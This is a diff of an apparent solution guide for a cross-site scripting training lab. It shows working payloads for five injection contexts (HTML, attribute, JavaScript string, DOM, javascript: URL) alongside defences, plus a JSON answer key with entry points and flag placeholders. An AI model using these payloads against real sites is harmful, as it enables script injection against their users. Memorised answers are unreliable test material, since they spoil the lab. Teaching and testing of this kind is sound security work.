@@ -45,9 +45,9 @@ Image gallery allows users to supply alt text for their uploaded images. The tem
 ```html
 <img src="image.jpg" alt="<%= user_input %>">
 ```
-The developer escaped the quotes in the alt value (good!) but the input can still break out by including another quote and space, then injecting attributes. Input like `x" onmouseover="alert('xss')` becomes:
+The developer escaped the quotes in the alt value (good!) but the input can still break out by including another quote and space, then injecting attributes. Input like `" onerror="fetch('/xss-success?variant=B').then(r=>r.json()).then(d=>alert('Flag: '+d.flag))" x="` becomes:
 ```html
-<img src="image.jpg" alt="x" onmouseover="alert('xss')">
+<img src="image.jpg" alt="" onerror="fetch('/xss-success?variant=B').then(r=>r.json()).then(d=>alert('Flag: '+d.flag))" x="">
 ```
 The first quote closes the alt attribute, then the new attribute executes.
 
@@ -131,28 +131,27 @@ FLAG!lab8_e_[hash]
 ## Exploitation Techniques by Context
 
 ### Context A: HTML Content
-**Payload**: `<img src=x onerror="alert('xss')">`
-**Why it works**: Browser parses < as tag start, creates img element, onerror fires on load failure
+**Payload**: `<script>alert('xss')</script>`
+**Why it works**: Browser parses < as tag start, creates script element, code executes immediately
 **Defense**: HTML entity encode: `&lt;img...`, or use innerText instead of innerHTML
 
 ### Context B: Attribute Breaking
-**Payload**: `x" onmouseover="alert('xss')`
-**Why it works**: Quote closes alt attribute, space separates, new attribute injected
+**Payload**: `" onerror="alert('xss')" x="`
+**Why it works**: Quote closes alt attribute, event handler injected as new attribute, onerror fires on invalid image
 **Defense**: Quote escaping + input validation, or use setAttribute() instead of template strings
 
 ### Context C: JavaScript String
-**Payload**: `"; alert('xss'); //`
+**Payload**: `"; alert('xss');//`
 **Why it works**: Quote ends string, semicolon ends statement, new statement executes, // comments remainder
 **Defense**: JavaScript escaping (not HTML), or use data instead of embedding in strings
 
 ### Context D: DOM Injection
-**Payload**: `<svg onload="alert('xss')">`
-**Why it works**: jQuery .html() parses tags, svg is valid, onload executes
+**Payload**: `<img src=x onerror="alert('xss')">`
 **Defense**: Use .text() instead of .html(), or sanitize with DOMPurify
 
 ### Context E: JavaScript Protocol
-**Payload**: `javascript:alert('xss')`
-**Why it works**: Browser interprets javascript: protocol, executes code
+**Payload**: `javascript:alert('xss');void(0)`
+**Why it works**: Browser interprets javascript: protocol, executes code, void(0) returns undefined (no navigation)
 **Defense**: Whitelist protocols (http://, https://), reject javascript:
 
 ---
@@ -186,9 +185,9 @@ The search query is embedded directly in HTML without escaping.
 <script>alert('XSS Works')</script>
 ```
 
-**To fetch flag:**
+**To trigger XSS:**
 ```html
-<script>fetch('/xss-success?variant=A').then(r=>r.json()).then(d=>alert('Flag: '+d.flag))</script>
+<script>alert('xss')</script>
 ```
 
 ### Exploitation Steps:
@@ -225,7 +224,7 @@ The alt text is embedded in an attribute without proper quoting.
 ### Attack Vector
 **Break out of attribute context:**
 ```
-" onerror="fetch('/xss-success?variant=B').then(r=>r.json()).then(d=>alert('Flag: '+d.flag))" x="
+" onerror="alert('xss')" x="
 ```
 
 ### Exploitation Steps:
@@ -272,7 +271,7 @@ User input is embedded in a JavaScript string without escaping.
 ### Attack Vector
 **Break out of string, execute code, comment out rest:**
 ```
-test"; fetch('/xss-success?variant=C').then(r=>r.json()).then(d=>alert('Flag: '+d.flag));//
+test"; alert('xss');//
 ```
 
 ### Exploitation Steps:
@@ -323,7 +322,7 @@ User post content is rendered directly as HTML.
 ### Attack Vector
 **Image tag with error handler:**
 ```html
-<img src=x onerror="fetch('/xss-success?variant=D').then(r=>r.json()).then(d=>alert('Flag: '+d.flag))">
+<img src=x onerror="alert('xss')">
 ```
 
 ### Exploitation Steps:
@@ -370,7 +369,7 @@ A user-controlled URL is placed directly in an href attribute.
 ### Attack Vector
 **JavaScript protocol:**
 ```javascript
-javascript:fetch('/xss-success?variant=E').then(r=>r.json()).then(d=>alert('Flag: '+d.flag));void(0)
+javascript:alert('xss');void(0)
 ```
 
 ### Exploitation Steps:
@@ -536,32 +535,32 @@ fetch('/xss-success?variant=A')
 {
   "Context_A_HTML": {
     "vulnerability": "Unescaped HTML content",
-    "payload": "<script>fetch('/xss-success?variant=A').then(r=>r.json()).then(d=>alert('Flag: '+d.flag))</script>",
+    "payload": "<script>alert('xss')</script>",
     "entry_point": "Search box",
     "flag": "FLAG!lab8_1a_[hash]"
   },
   "Context_B_Attribute": {
     "vulnerability": "Unquoted/improperly quoted attribute",
-    "payload": "\" onerror=\"fetch('/xss-success?variant=B').then(r=>r.json()).then(d=>alert('Flag: '+d.flag))\" x=\"",
+    "payload": "\" onerror=\"alert('xss')\" x=\"",
     "entry_point": "Image alt text",
     "flag": "FLAG!lab8_1b_[hash]"
   },
   "Context_C_JavaScript": {
     "vulnerability": "Unescaped string in JavaScript",
-    "payload": "test\"; fetch('/xss-success?variant=C').then(r=>r.json()).then(d=>alert('Flag: '+d.flag));//",
+    "payload": "test\"; alert('xss');//",
     "entry_point": "Description field",
     "execution_context": "Script tag content",
     "flag": "FLAG!lab8_1c_[hash]"
   },
   "Context_D_DOM": {
     "vulnerability": "User content rendered as HTML",
-    "payload": "<img src=x onerror=\"fetch('/xss-success?variant=D').then(r=>r.json()).then(d=>alert('Flag: '+d.flag))\">",
+    "payload": "<img src=x onerror=\"alert('xss')\">",
     "entry_point": "Post content",
     "flag": "FLAG!lab8_1d_[hash]"
   },
   "Context_E_URL": {
     "vulnerability": "JavaScript protocol in href",
-    "payload": "javascript:fetch('/xss-success?variant=E').then(r=>r.json()).then(d=>alert('Flag: '+d.flag));void(0)",
+    "payload": "javascript:alert('xss');void(0)",
     "entry_point": "Source URL",
     "trigger": "Must click link",
     "flag": "FLAG!lab8_1e_[hash]"
